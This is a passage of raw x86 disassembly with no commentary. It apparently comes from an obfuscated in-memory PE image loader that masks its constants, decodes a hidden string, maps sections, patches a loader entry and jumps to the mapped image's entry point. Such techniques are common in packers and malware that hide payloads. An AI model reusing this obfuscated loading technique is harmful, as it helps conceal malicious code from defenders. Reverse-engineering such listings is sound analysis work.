  427848:	jmp    0x42784d
  42784a:	mov    eax,DWORD PTR [ebp-0x4]
  42784d:	xor    eax,ecx
  42784f:	add    eax,edx
  427851:	pop    esi
  427852:	leave  
  427853:	ret    0x8
  427856:	push   ebp
  427857:	mov    ebp,esp
  427859:	sub    esp,0xd8
  42785f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427866:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  42786d:	mov    eax,DWORD PTR [ebp-0x4]
  427870:	push   ebx
  427871:	push   esi
  427872:	mov    esi,0x75108ae
  427877:	xor    eax,esi
  427879:	push   edi
  42787a:	mov    edi,0x3272f5
  42787f:	add    eax,edi
  427881:	mov    DWORD PTR [ebp-0x18],eax
  427884:	mov    eax,DWORD PTR [ebp-0x4]
  427887:	xor    eax,esi
  427889:	add    eax,edi
  42788b:	mov    DWORD PTR [ebp-0x8],eax
  42788e:	mov    ebx,DWORD PTR [ebp+0x20]
  427891:	mov    eax,DWORD PTR [ebp-0x1c]
  427894:	mov    ecx,DWORD PTR [ebp-0x1c]
  427897:	xor    eax,ecx
  427899:	mov    DWORD PTR [ebp-0x1c],eax
  42789c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4278a3:	mov    eax,DWORD PTR [ebp-0xc]
  4278a6:	mov    ecx,DWORD PTR [ebp-0xc]
  4278a9:	xor    eax,ecx
  4278ab:	mov    DWORD PTR [ebp-0xc],eax
  4278ae:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4278b5:	mov    eax,DWORD PTR [ebp-0x10]
  4278b8:	mov    ecx,DWORD PTR [ebp-0x10]
  4278bb:	xor    eax,ecx
  4278bd:	mov    DWORD PTR [ebp-0x10],eax
  4278c0:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  4278c7:	mov    eax,DWORD PTR [ebp-0x28]
  4278ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4278cd:	xor    eax,ecx
  4278cf:	mov    DWORD PTR [ebp-0x28],eax
  4278d2:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4278d9:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4278e0:	mov    eax,DWORD PTR [ebp+0x8]
  4278e3:	test   eax,eax
  4278e5:	je     0x427d6c
  4278eb:	mov    eax,DWORD PTR [ebp+0xc]
  4278ee:	test   eax,eax
  4278f0:	je     0x427d6c
  4278f6:	mov    eax,DWORD PTR [ebp+0x18]
  4278f9:	test   eax,eax
  4278fb:	je     0x427d6c
  427901:	mov    eax,DWORD PTR [ebp+0x20]
  427904:	mov    ecx,DWORD PTR [ebp+0x8]
  427907:	xor    eax,0x8ae
  42790c:	add    eax,0x72f5
  427911:	cmp    WORD PTR [ecx],ax
  427914:	jne    0x427d6c
  42791a:	mov    eax,DWORD PTR [ebp-0x4]
  42791d:	xor    eax,esi
  42791f:	add    eax,edi
  427921:	mov    DWORD PTR [ebp-0x30],eax
  427924:	mov    eax,DWORD PTR [ebp-0x4]
  427927:	mov    ecx,DWORD PTR [ebp+0x8]
  42792a:	mov    eax,DWORD PTR [ebp+0x8]
  42792d:	add    eax,DWORD PTR [ecx+0x3c]
  427930:	mov    DWORD PTR [ebp+0xc],eax
  427933:	mov    eax,DWORD PTR [eax+0x50]
  427936:	test   eax,eax
  427938:	je     0x427d6c
  42793e:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427945:	mov    eax,DWORD PTR [ebp-0x2c]
  427948:	xor    eax,esi
  42794a:	add    eax,edi
  42794c:	mov    DWORD PTR [ebp-0x2c],eax
  42794f:	mov    eax,DWORD PTR [ebp-0x4]
  427952:	mov    eax,DWORD PTR [ebx+0x190]
  427958:	mov    ecx,DWORD PTR [eax]
  42795a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42795d:	add    ecx,DWORD PTR [eax]
  42795f:	mov    eax,DWORD PTR [ebp-0x4]
  427962:	mov    eax,DWORD PTR [ebx+0x18c]
  427968:	mov    edx,DWORD PTR [eax]
  42796a:	mov    DWORD PTR [ebp-0x20],ecx
  42796d:	mov    DWORD PTR [ebp+0x20],edx
  427970:	cmp    edx,edx
  427972:	jne    0x4279a6
  427974:	mov    eax,DWORD PTR [ebx+0x1e0]
  42797a:	lea    edx,[ebp-0x18]
  42797d:	push   edx
  42797e:	mov    edx,DWORD PTR [ebp-0xc]
  427981:	xor    edx,esi
  427983:	add    edx,edi
  427985:	push   edx
  427986:	push   DWORD PTR [ecx+0x50]
  427989:	push   DWORD PTR [ebp+0x20]
  42798c:	call   DWORD PTR [eax+0x1c]
  42798f:	mov    eax,DWORD PTR [ebp-0x20]
  427992:	mov    ecx,DWORD PTR [eax+0x54]
  427995:	mov    eax,DWORD PTR [eax+0x50]
  427998:	sub    eax,ecx
  42799a:	add    ecx,DWORD PTR [ebp+0x20]
  42799d:	push   ecx
  42799e:	call   0x428309
  4279a3:	mov    edx,DWORD PTR [ebp+0x20]
  4279a6:	mov    eax,DWORD PTR [ebx+0x194]
  4279ac:	mov    DWORD PTR [eax],edx
  4279ae:	mov    eax,DWORD PTR [ebp+0xc]
  4279b1:	push   DWORD PTR [eax+0x54]
  4279b4:	push   DWORD PTR [ebp+0x8]
  4279b7:	push   edx
  4279b8:	call   0x4281ff
  4279bd:	mov    ecx,DWORD PTR [ebp+0x20]
  4279c0:	mov    eax,DWORD PTR [ecx+0x3c]
  4279c3:	add    eax,ecx
  4279c5:	movzx  ecx,WORD PTR [eax+0x14]
  4279c9:	lea    ecx,[ecx+eax*1+0x18]
  4279cd:	mov    DWORD PTR [ebp+0x18],ecx
  4279d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4279d3:	movzx  edx,WORD PTR [eax+0x6]
  4279d7:	xor    ecx,esi
  4279d9:	add    ecx,edi
  4279db:	mov    DWORD PTR [ebp+0xc],eax
  4279de:	cmp    edx,ecx
  4279e0:	je     0x427a8d
  4279e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4279e9:	xor    ecx,esi
  4279eb:	add    ecx,edi
  4279ed:	mov    DWORD PTR [ebp-0x8],ecx
  4279f0:	mov    ecx,DWORD PTR [ebp-0x24]
  4279f3:	movzx  edx,WORD PTR [eax+0x6]
  4279f7:	xor    ecx,esi
  4279f9:	sub    edx,ecx
  4279fb:	sub    edx,edi
  4279fd:	cmp    DWORD PTR [ebp-0x8],edx
  427a00:	ja     0x427a8d
  427a06:	mov    edx,DWORD PTR [ebp+0x18]
  427a09:	add    edx,0x8
  427a0c:	mov    DWORD PTR [ebp+0x18],edx
  427a0f:	jmp    0x427a14
  427a11:	mov    edx,DWORD PTR [ebp+0x18]
  427a14:	mov    eax,DWORD PTR [eax+0x38]
  427a17:	lea    ecx,[eax-0x1]
  427a1a:	mov    DWORD PTR [ebp-0x38],eax
  427a1d:	mov    eax,DWORD PTR [edx]
  427a1f:	test   eax,ecx
  427a21:	je     0x427a2a
  427a23:	not    ecx
  427a25:	and    eax,ecx
  427a27:	add    eax,DWORD PTR [ebp-0x38]
  427a2a:	mov    ecx,DWORD PTR [edx+0x4]
  427a2d:	add    ecx,DWORD PTR [ebp+0x20]
  427a30:	push   ecx
  427a31:	call   0x428309
  427a36:	mov    edx,DWORD PTR [ebp-0x4]
  427a39:	mov    eax,DWORD PTR [ebp+0x18]
  427a3c:	mov    ecx,DWORD PTR [eax+0x8]
  427a3f:	xor    edx,esi
  427a41:	add    edx,edi
  427a43:	cmp    ecx,edx
  427a45:	je     0x427a5e
  427a47:	push   ecx
  427a48:	mov    ecx,DWORD PTR [ebp+0x8]
  427a4b:	add    ecx,DWORD PTR [eax+0xc]
  427a4e:	mov    eax,DWORD PTR [eax+0x4]
  427a51:	add    eax,DWORD PTR [ebp+0x20]
  427a54:	push   ecx
  427a55:	push   eax
  427a56:	call   0x4281ff
  427a5b:	mov    eax,DWORD PTR [ebp+0x18]
  427a5e:	mov    ecx,DWORD PTR [ebp-0x24]
  427a61:	mov    edx,DWORD PTR [ebp-0x8]
  427a64:	add    eax,0x28
  427a67:	xor    ecx,esi
  427a69:	lea    ecx,[edx+ecx*1+0x3272f5]
  427a70:	mov    edx,DWORD PTR [ebp+0xc]
  427a73:	mov    DWORD PTR [ebp+0x18],eax
  427a76:	mov    eax,DWORD PTR [ebp-0x24]
  427a79:	movzx  edx,WORD PTR [edx+0x6]
  427a7d:	xor    eax,esi
  427a7f:	sub    edx,eax
  427a81:	mov    eax,DWORD PTR [ebp+0xc]
  427a84:	sub    edx,edi
  427a86:	mov    DWORD PTR [ebp-0x8],ecx
  427a89:	cmp    ecx,edx
  427a8b:	jbe    0x427a11
  427a8d:	mov    edx,DWORD PTR [ebx+0x18c]
  427a93:	mov    ecx,DWORD PTR [ebp+0x20]
  427a96:	cmp    ecx,DWORD PTR [edx]
  427a98:	jne    0x427ac1
  427a9a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427aa0:	lea    edx,[ebp-0x18]
  427aa3:	push   edx
  427aa4:	mov    edx,DWORD PTR [ebp-0x10]
  427aa7:	xor    edx,esi
  427aa9:	add    edx,edi
  427aab:	push   edx
  427aac:	mov    edx,DWORD PTR [ebp-0x20]
  427aaf:	push   DWORD PTR [edx+0x54]
  427ab2:	push   ecx
  427ab3:	call   DWORD PTR [eax+0x1c]
  427ab6:	test   eax,eax
  427ab8:	je     0x427d5d
  427abe:	mov    eax,DWORD PTR [ebp+0xc]
  427ac1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427ac7:	mov    ecx,DWORD PTR [ecx]
  427ac9:	xor    ecx,esi
  427acb:	add    ecx,edi
  427acd:	je     0x427c88
  427ad3:	mov    eax,DWORD PTR [ebp-0x4]
  427ad6:	xor    eax,esi
  427ad8:	add    eax,edi
  427ada:	and    DWORD PTR [ebp+0x8],0x0
  427ade:	mov    DWORD PTR [ebp-0x14],eax
  427ae1:	mov    eax,0xf89c85c1
  427ae6:	lea    ecx,[eax+0x18]
  427ae9:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427af0:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427af7:	mov    DWORD PTR [ebp-0x50],eax
  427afa:	mov    DWORD PTR [ebp-0x4c],ecx
  427afd:	mov    DWORD PTR [ebp-0x48],ecx
  427b00:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427b07:	mov    edx,DWORD PTR [ebp+0x8]
  427b0a:	mov    ecx,0x8ae
  427b0f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427b14:	mov    edx,0x72f5
  427b19:	add    cx,dx
  427b1c:	mov    edx,DWORD PTR [ebp+0x8]
  427b1f:	inc    DWORD PTR [ebp+0x8]
  427b22:	cmp    DWORD PTR [ebp+0x8],0x6
  427b26:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427b2e:	jb     0x427b07
  427b30:	mov    ecx,0xf89c85d3
  427b35:	mov    DWORD PTR [ebp-0xb0],eax
  427b3b:	mov    DWORD PTR [ebp-0x9c],eax
  427b41:	mov    DWORD PTR [ebp-0x74],eax
  427b44:	mov    DWORD PTR [ebp-0x70],eax
  427b47:	lea    eax,[ecx-0x3]
  427b4a:	lea    edx,[ecx+0x2c]
  427b4d:	mov    DWORD PTR [ebp-0x64],eax
  427b50:	mov    DWORD PTR [ebp-0x60],eax
  427b53:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427b5d:	mov    DWORD PTR [ebp-0xac],ecx
  427b63:	mov    DWORD PTR [ebp-0xa8],edx
  427b69:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427b73:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427b7d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427b87:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427b91:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427b9b:	mov    DWORD PTR [ebp-0x8c],ecx
  427ba1:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427bab:	mov    DWORD PTR [ebp-0x84],edx
  427bb1:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427bb8:	mov    DWORD PTR [ebp-0x7c],ecx
  427bbb:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427bc2:	mov    DWORD PTR [ebp-0x6c],ecx
  427bc5:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427bcc:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427bd3:	xor    eax,eax
  427bd5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427bdc:	xor    cl,0xae
  427bdf:	sub    cl,0xb
  427be2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427be9:	inc    eax
  427bea:	cmp    eax,0x17
  427bed:	jb     0x427bd5
  427bef:	mov    eax,DWORD PTR [ebx+0x1e0]
  427bf5:	lea    ecx,[ebp-0xc0]
  427bfb:	push   ecx
  427bfc:	call   DWORD PTR [eax+0x4]
  427bff:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427c05:	lea    edx,[ebp-0xd8]
  427c0b:	push   edx
  427c0c:	push   eax
  427c0d:	call   DWORD PTR [ecx+0x8]
  427c10:	mov    DWORD PTR [ebp-0x40],eax
  427c13:	lea    eax,[ebp-0x14]
  427c16:	push   eax
  427c17:	mov    eax,DWORD PTR [ebx+0x18c]
  427c1d:	push   DWORD PTR [eax]
  427c1f:	mov    eax,DWORD PTR [ebp-0x40]
  427c22:	call   eax
  427c24:	mov    eax,DWORD PTR [ebp-0x4]
  427c27:	xor    eax,esi
  427c29:	add    eax,edi
  427c2b:	mov    DWORD PTR [ebp-0x34],eax
  427c2e:	mov    ecx,DWORD PTR [ebp-0x4]
  427c31:	mov    eax,DWORD PTR [ebp-0x14]
  427c34:	xor    ecx,esi
  427c36:	add    ecx,edi
  427c38:	cmp    eax,ecx
  427c3a:	je     0x427c85
  427c3c:	mov    DWORD PTR [ebp-0x3c],eax
  427c3f:	jmp    0x427c50
  427c41:	mov    eax,DWORD PTR [eax]
  427c43:	mov    ecx,DWORD PTR [ebp-0x3c]
  427c46:	mov    DWORD PTR [ebp-0x14],eax
  427c49:	mov    eax,DWORD PTR [ebp-0x14]
  427c4c:	cmp    eax,ecx
  427c4e:	je     0x427c5d
  427c50:	mov    edx,DWORD PTR [eax+0x18]
  427c53:	mov    ecx,DWORD PTR [ebx+0x18c]
  427c59:	cmp    edx,DWORD PTR [ecx]
  427c5b:	jne    0x427c41
  427c5d:	mov    ecx,DWORD PTR [ebx+0x18c]
  427c63:	mov    edx,DWORD PTR [eax+0x18]
  427c66:	cmp    edx,DWORD PTR [ecx]
  427c68:	jne    0x427c85
  427c6a:	mov    ecx,DWORD PTR [ebx+0x190]
  427c70:	mov    edx,DWORD PTR [ebp-0x20]
  427c73:	mov    edx,DWORD PTR [edx+0x28]
  427c76:	add    edx,DWORD PTR [ecx]
  427c78:	mov    DWORD PTR [eax+0x1c],edx
  427c7b:	mov    eax,DWORD PTR [ebp-0x24]
  427c7e:	xor    eax,esi
  427c80:	add    eax,edi
  427c82:	mov    DWORD PTR [ebp-0x34],eax
  427c85:	mov    eax,DWORD PTR [ebp+0xc]
  427c88:	push   ebx
  427c89:	push   eax
  427c8a:	push   DWORD PTR [ebp+0x20]
  427c8d:	call   0x42740d
  427c92:	test   eax,eax
  427c94:	je     0x427d5d
  427c9a:	push   DWORD PTR [ebp+0xc]
  427c9d:	mov    ecx,ebx
  427c9f:	push   DWORD PTR [ebp+0x20]
  427ca2:	call   0x427366
  427ca7:	test   eax,eax
  427ca9:	je     0x427d5d
  427caf:	mov    eax,DWORD PTR [ebp+0xc]
  427cb2:	mov    edx,DWORD PTR [ebp+0x20]
  427cb5:	mov    ecx,ebx
  427cb7:	call   0x42723f
  427cbc:	test   eax,eax
  427cbe:	je     0x427d5d
  427cc4:	push   ebx
  427cc5:	push   DWORD PTR [ebp+0x20]
  427cc8:	call   0x4276f0
  427ccd:	test   eax,eax
  427ccf:	je     0x427d5d
  427cd5:	mov    eax,DWORD PTR [ebx+0x18c]
  427cdb:	mov    edx,DWORD PTR [ebp+0x20]
  427cde:	cmp    edx,DWORD PTR [eax]
  427ce0:	jne    0x427cfc
  427ce2:	mov    eax,DWORD PTR [ebx+0x1e0]
  427ce8:	lea    ecx,[ebp-0x18]
  427ceb:	push   ecx
  427cec:	push   DWORD PTR [ebp-0x18]
  427cef:	mov    ecx,DWORD PTR [ebp-0x20]
  427cf2:	push   DWORD PTR [ecx+0x54]
  427cf5:	push   edx
  427cf6:	call   DWORD PTR [eax+0x1c]
  427cf9:	mov    edx,DWORD PTR [ebp+0x20]
  427cfc:	mov    eax,DWORD PTR [ebx+0x1c8]
  427d02:	mov    eax,DWORD PTR [eax]
  427d04:	xor    eax,esi
  427d06:	add    eax,edi
  427d08:	je     0x427d41
  427d0a:	mov    ecx,DWORD PTR [ebp+0xc]
  427d0d:	mov    eax,DWORD PTR [ecx+0x28]
  427d10:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427d17:	mov    esi,DWORD PTR [ebp+0x8]
  427d1a:	push   DWORD PTR [ebp+0x14]
  427d1d:	xor    esi,0x8ae
  427d23:	push   DWORD PTR [ebp+0x10]
  427d26:	add    esi,0x72f5
  427d2c:	or     WORD PTR [ecx+0x16],si
  427d30:	add    eax,edx
  427d32:	push   edx
  427d33:	call   eax
  427d35:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427d3f:	jmp    0x427d4b
  427d41:	mov    eax,DWORD PTR [ebp+0xc]
  427d44:	mov    eax,DWORD PTR [eax+0x28]
  427d47:	add    eax,edx
  427d49:	call   eax
  427d4b:	mov    DWORD PTR [ebp-0x8],eax
  427d4e:	mov    eax,DWORD PTR [ebp-0x8]
  427d51:	mov    ecx,DWORD PTR [ebp+0x1c]
  427d54:	mov    DWORD PTR [ecx],eax
  427d56:	mov    DWORD PTR [ebp-0x30],0x1
  427d5d:	cmp    DWORD PTR [ebp-0x30],0x0
  427d61:	jne    0x427d67
  427d63:	and    DWORD PTR [ebp+0x20],0x0
  427d67:	mov    eax,DWORD PTR [ebp+0x20]
  427d6a:	jmp    0x427d6e
  427d6c:	xor    eax,eax
  427d6e:	pop    edi
  427d6f:	pop    esi
  427d70:	pop    ebx
  427d71:	leave  
  427d72:	ret    0x1c
  427d75:	push   ebp
  427d76:	mov    ebp,esp
  427d78:	movzx  edx,WORD PTR [ecx+0x6]
  427d7c:	movzx  eax,WORD PTR [ecx+0x14]
  427d80:	push   ebx
  427d81:	push   edi
  427d82:	xor    edi,edi
  427d84:	lea    eax,[eax+ecx*1+0x18]
  427d88:	test   edx,edx
  427d8a:	je     0x427dab
  427d8c:	mov    ecx,DWORD PTR [eax+0xc]
  427d8f:	lea    ebx,[ecx+esi*1]
  427d92:	cmp    DWORD PTR [ebp+0x8],ebx
  427d95:	jb     0x427da3
  427d97:	mov    ebx,DWORD PTR [eax+0x8]
  427d9a:	add    ebx,ecx
  427d9c:	add    ebx,esi
  427d9e:	cmp    DWORD PTR [ebp+0x8],ebx
  427da1:	jb     0x427dad
  427da3:	add    eax,0x28
  427da6:	inc    edi
  427da7:	cmp    edi,edx
  427da9:	jb     0x427d8c
  427dab:	xor    eax,eax
  427dad:	pop    edi
  427dae:	pop    ebx
  427daf:	pop    ebp
  427db0:	ret    0x4
  427db3:	push   ebp
  427db4:	mov    ebp,esp
  427db6:	sub    esp,0x34
  427db9:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427dc0:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427dc7:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427dce:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427dd5:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427ddc:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427de3:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427dea:	mov    DWORD PTR [ebp-0x10],eax
  427ded:	mov    eax,DWORD PTR [ebp+0x8]
  427df0:	mov    DWORD PTR [ebp-0x14],eax
  427df3:	mov    eax,DWORD PTR [ebp-0xc]
  427df6:	push   ebx
  427df7:	mov    ecx,0x75108ae
  427dfc:	xor    eax,ecx
  427dfe:	push   esi
  427dff:	mov    esi,DWORD PTR [ebp-0x10]
  427e02:	mov    edx,0x3272f5
  427e07:	add    eax,edx
  427e09:	push   edi
  427e0a:	cmp    esi,eax
  427e0c:	je     0x427feb
  427e12:	mov    eax,DWORD PTR [ebp-0xc]
  427e15:	mov    esi,DWORD PTR [ebp-0x14]
  427e18:	xor    eax,ecx
  427e1a:	add    eax,edx
  427e1c:	cmp    esi,eax
  427e1e:	je     0x427feb
  427e24:	mov    eax,DWORD PTR [ebp-0xc]
  427e27:	xor    eax,ecx
  427e29:	add    eax,edx
  427e2b:	mov    DWORD PTR [ebp-0x24],eax
  427e2e:	mov    eax,DWORD PTR [ebp-0xc]
  427e31:	xor    eax,ecx
  427e33:	add    eax,edx
  427e35:	mov    DWORD PTR [ebp-0x28],eax
  427e38:	mov    edi,DWORD PTR [ebp-0x20]
  427e3b:	mov    ebx,DWORD PTR [ebp-0x8]
  427e3e:	mov    esi,0x8ae
  427e43:	xor    edi,esi
  427e45:	mov    eax,0x72f5
  427e4a:	xor    ebx,esi
  427e4c:	add    edi,eax
  427e4e:	add    ebx,eax
  427e50:	sub    ebx,edi
  427e52:	mov    WORD PTR [ebp-0x8],bx
  427e56:	jmp    0x427f1b
  427e5b:	mov    edi,DWORD PTR [ebp-0xc]
  427e5e:	mov    bx,WORD PTR [ebp-0x4]
  427e62:	xor    edi,esi
  427e64:	add    edi,eax
  427e66:	cmp    bx,di
  427e69:	je     0x427f5d
  427e6f:	mov    edi,DWORD PTR [ebp-0xc]
  427e72:	mov    ebx,DWORD PTR [ebp+0xc]
  427e75:	xor    edi,ecx
  427e77:	add    edi,edx
  427e79:	cmp    ebx,edi
  427e7b:	mov    di,WORD PTR [ebp-0x4]
  427e7f:	mov    bx,WORD PTR [ebp+0x8]
  427e83:	je     0x427eee
  427e85:	cmp    bx,di
  427e88:	je     0x427ef7
  427e8a:	mov    edi,DWORD PTR [ebp-0x20]
  427e8d:	mov    bx,WORD PTR [ebp+0x8]
  427e91:	xor    edi,esi
  427e93:	add    edi,eax
  427e95:	cmp    bx,di
  427e98:	jb     0x427eb8
  427e9a:	mov    edi,DWORD PTR [ebp-0x2c]
  427e9d:	mov    bx,WORD PTR [ebp+0x8]
  427ea1:	xor    edi,esi
  427ea3:	add    edi,eax
  427ea5:	cmp    bx,di
  427ea8:	ja     0x427eb8
  427eaa:	movzx  edi,WORD PTR [ebp+0x8]
  427eae:	movzx  ebx,WORD PTR [ebp-0x8]
  427eb2:	add    edi,ebx
  427eb4:	mov    WORD PTR [ebp+0x8],di
  427eb8:	mov    edi,DWORD PTR [ebp-0x20]
  427ebb:	mov    bx,WORD PTR [ebp-0x4]
  427ebf:	xor    edi,esi
  427ec1:	add    edi,eax
  427ec3:	cmp    bx,di
  427ec6:	jb     0x427ee6
  427ec8:	mov    edi,DWORD PTR [ebp-0x2c]
  427ecb:	mov    bx,WORD PTR [ebp-0x4]
  427ecf:	xor    edi,esi
  427ed1:	add    edi,eax
  427ed3:	cmp    bx,di
  427ed6:	ja     0x427ee6
  427ed8:	movzx  edi,WORD PTR [ebp-0x4]
  427edc:	movzx  ebx,WORD PTR [ebp-0x8]
  427ee0:	add    edi,ebx
  427ee2:	mov    WORD PTR [ebp-0x4],di
  427ee6:	mov    di,WORD PTR [ebp-0x4]
  427eea:	mov    bx,WORD PTR [ebp+0x8]
  427eee:	cmp    bx,di
  427ef1:	jne    0x427feb
  427ef7:	mov    edi,DWORD PTR [ebp-0x1c]
  427efa:	mov    ebx,DWORD PTR [ebp-0x10]
  427efd:	xor    edi,ecx
  427eff:	lea    edi,[edi+ebx*1+0x3272f5]
  427f06:	mov    DWORD PTR [ebp-0x10],edi
  427f09:	mov    edi,DWORD PTR [ebp-0x1c]
  427f0c:	mov    ebx,DWORD PTR [ebp-0x14]
  427f0f:	xor    edi,ecx
  427f11:	lea    edi,[edi+ebx*1+0x3272f5]
  427f18:	mov    DWORD PTR [ebp-0x14],edi
  427f1b:	mov    edi,DWORD PTR [ebp-0x24]
  427f1e:	mov    ebx,DWORD PTR [ebp-0x10]
  427f21:	mov    di,WORD PTR [ebx+edi*2]
  427f25:	mov    WORD PTR [ebp+0x8],di
  427f29:	mov    edi,DWORD PTR [ebp-0x28]
  427f2c:	mov    ebx,DWORD PTR [ebp-0x14]
  427f2f:	mov    di,WORD PTR [ebx+edi*2]
  427f33:	mov    WORD PTR [ebp-0x4],di
  427f37:	mov    edi,DWORD PTR [ebp-0xc]
  427f3a:	mov    bx,WORD PTR [ebp+0x8]
  427f3e:	xor    edi,esi
  427f40:	add    edi,eax
  427f42:	cmp    bx,di
  427f45:	jne    0x427e5b
  427f4b:	mov    eax,DWORD PTR [ebp-0x18]
  427f4e:	mov    esi,DWORD PTR [ebp-0xc]
  427f51:	xor    eax,ecx
  427f53:	add    eax,edx
  427f55:	imul   eax,esi
  427f58:	mov    DWORD PTR [ebp-0xc],eax
  427f5b:	jmp    0x427f6f
  427f5d:	mov    eax,DWORD PTR [ebp-0xc]
  427f60:	mov    esi,DWORD PTR [ebp-0x18]
  427f63:	xor    eax,ecx
  427f65:	lea    eax,[eax+esi*1+0x3272f5]
  427f6c:	mov    DWORD PTR [ebp-0x18],eax
  427f6f:	mov    eax,DWORD PTR [ebp-0x24]
  427f72:	sub    eax,edx
  427f74:	xor    eax,ecx
  427f76:	mov    DWORD PTR [ebp-0x30],eax
  427f79:	mov    eax,DWORD PTR [ebp-0x28]
  427f7c:	sub    eax,edx
  427f7e:	xor    eax,ecx
  427f80:	mov    DWORD PTR [ebp-0x34],eax
  427f83:	mov    eax,DWORD PTR [ebp-0x34]
  427f86:	mov    esi,DWORD PTR [ebp-0x1c]
  427f89:	xor    esi,ecx
  427f8b:	add    esi,edx
  427f8d:	xor    eax,ecx
  427f8f:	add    eax,0x3272f5
  427f94:	imul   esi,eax
  427f97:	mov    eax,DWORD PTR [ebp-0x14]
  427f9a:	movzx  eax,WORD PTR [esi+eax*1]
  427f9e:	mov    esi,DWORD PTR [ebp-0x30]
  427fa1:	mov    edi,DWORD PTR [ebp-0x1c]
  427fa4:	xor    esi,ecx
  427fa6:	add    esi,edx
  427fa8:	xor    edi,ecx
  427faa:	add    edi,edx
  427fac:	imul   edi,esi
  427faf:	mov    esi,DWORD PTR [ebp-0x10]
  427fb2:	movzx  esi,WORD PTR [edi+esi*1]
  427fb6:	sub    eax,edx
  427fb8:	sub    esi,edx
  427fba:	xor    eax,ecx
  427fbc:	xor    esi,ecx
  427fbe:	cmp    esi,eax
  427fc0:	jne    0x427feb
  427fc2:	mov    eax,DWORD PTR [ebp-0x30]
  427fc5:	mov    esi,DWORD PTR [ebp-0x1c]
  427fc8:	xor    eax,ecx
  427fca:	add    eax,0x3272f5
  427fcf:	xor    esi,ecx
  427fd1:	add    esi,edx
  427fd3:	imul   esi,eax
  427fd6:	mov    eax,DWORD PTR [ebp-0x10]
  427fd9:	movzx  eax,WORD PTR [esi+eax*1]
  427fdd:	mov    esi,DWORD PTR [ebp-0xc]
  427fe0:	sub    eax,edx
  427fe2:	xor    eax,ecx
  427fe4:	cmp    eax,esi
  427fe6:	mov    eax,DWORD PTR [ebp-0xc]
  427fe9:	je     0x427fee
  427feb:	mov    eax,DWORD PTR [ebp-0x18]
  427fee:	pop    edi
  427fef:	xor    eax,ecx
  427ff1:	pop    esi
  427ff2:	add    eax,edx
  427ff4:	pop    ebx
  427ff5:	leave  
  427ff6:	ret    0x8
  427ff9:	push   ebp
  427ffa:	mov    ebp,esp
  427ffc:	push   ecx
  427ffd:	mov    cx,WORD PTR [eax]
  428000:	push   esi
  428001:	mov    esi,0x3b5c
  428006:	sub    cx,si
  428009:	mov    esi,0x8a9a
  42800e:	xor    cx,si
  428011:	mov    esi,0x4e3e
  428016:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  42801d:	mov    edx,0xf89c85a5
  428022:	cmp    cx,si
  428025:	je     0x428084
  428027:	push   ebx
  428028:	push   edi
  428029:	movzx  ecx,cx
  42802c:	mov    edi,0xffcd8d0b
  428031:	mov    esi,0x75108ae
  428036:	mov    ebx,0x4f9a
  42803b:	cmp    cx,bx
  42803e:	jne    0x428043
  428040:	mov    DWORD PTR [ebp-0x4],edx
  428043:	lea    edx,[edi+0x1]
  428046:	xor    edx,esi
  428048:	mov    edi,edx
  42804a:	xor    edi,esi
  42804c:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  428054:	mov    ebx,0x3b5c
  428059:	sub    cx,bx
  42805c:	mov    ebx,0x8a9a
  428061:	xor    cx,bx
  428064:	mov    ebx,0x4e3e
  428069:	cmp    cx,bx
  42806c:	jne    0x428036
  42806e:	mov    ecx,DWORD PTR [ebp-0x4]
  428071:	pop    edi
  428072:	pop    ebx
  428073:	cmp    ecx,0xf89c85a4
  428079:	je     0x428084
  42807b:	xor    ecx,esi
  42807d:	lea    eax,[eax+ecx*2+0x64e5ec]
  428084:	pop    esi
  428085:	leave  
  428086:	ret    
  428087:	push   ebp
  428088:	mov    ebp,esp
  42808a:	push   ecx
  42808b:	push   esi
  42808c:	push   edi
  42808d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428094:	mov    esi,0xf89c85a5
  428099:	call   0x427ff9
  42809e:	mov    edi,eax
  4280a0:	mov    al,BYTE PTR [edi]
  4280a2:	sub    al,0x3
  4280a4:	xor    al,0x7e
  4280a6:	cmp    al,0x83
  4280a8:	je     0x42810b
  4280aa:	mov    eax,edi
  4280ac:	mov    edx,0xffcd8d0b
